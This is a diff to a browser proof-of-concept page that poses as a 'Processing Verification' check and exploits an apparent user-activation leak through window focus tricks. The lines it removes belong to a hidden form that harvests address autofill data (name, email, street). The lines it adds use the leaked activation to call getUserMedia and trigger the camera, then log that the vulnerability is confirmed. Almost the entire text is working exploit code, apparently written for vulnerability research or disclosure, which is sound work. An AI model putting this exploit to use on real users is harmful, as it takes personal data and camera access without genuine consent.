@@ -12,45 +12,28 @@
         <h1>Processing Verification...</h1>
         <p>Stay on the previous page to complete the check.</p>
     </div>
-
-    <div id="address-form"
-        style="display: none; margin-top: 20px; background: white; padding: 20px; border-radius: 8px; border: 1px solid #ccc; text-align: left; max-width: 400px; margin-left: auto; margin-right: auto;">
-        <h3 style="text-align: center;">Confirm Shipping Address</h3>
-
-        <label>Full Name:</label>
-        <input type="text" id="target-focus" name="fullname" autocomplete="name"
-            style="width: 100%; margin-bottom: 10px;">
-
-        <label>Email:</label>
-        <input type="email" name="email" autocomplete="email" style="width: 100%; margin-bottom: 10px;">
-
-        <label>Street Address:</label>
-        <input type="text" name="address" autocomplete="address-line1" style="width: 100%; margin-bottom: 10px;">
-
-        <p style="font-size: 10px; color: #999;">* This form will be auto-filled via leaked activation.</p>
-    </div>
-
     <script>
         let currentStage = 1;
-
         function checkAndExploit() {
             const isActive = navigator.userActivation.isActive;
-            const formContainer = document.getElementById('address-form');
-            const statusContainer = document.getElementById('status-container');
-            const focusField = document.getElementById('target-focus');
 
             if (currentStage === 1) {
                 if (window.opener) window.opener.focus();
                 currentStage = 2;
             }
-            else if (currentStage === 2 && isActive) {
-                statusContainer.style.display = 'none';
-                formContainer.style.display = 'block';
-                focusField.focus();
-                focusField.click();
-
-                console.log("[!!!] Address Autofill triggered via activation leak.");
-            }
+else if (currentStage === 2 && isActive) {
+    statusContainer.innerHTML = "<h1>Triggering Media...</h1>";
+    
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            console.log("[SUCCESS] Activation leak used to trigger camera.");
+            stream.getTracks().forEach(track => track.stop());
+            alert("Vulnerability Confirmed: Camera triggered via User Activation Leak.");
+        })
+        .catch((err) => {
+            console.log("API Triggered, Result: " + err.name);
+        });
+}
         }
 
         window.addEventListener("focus", checkAndExploit);
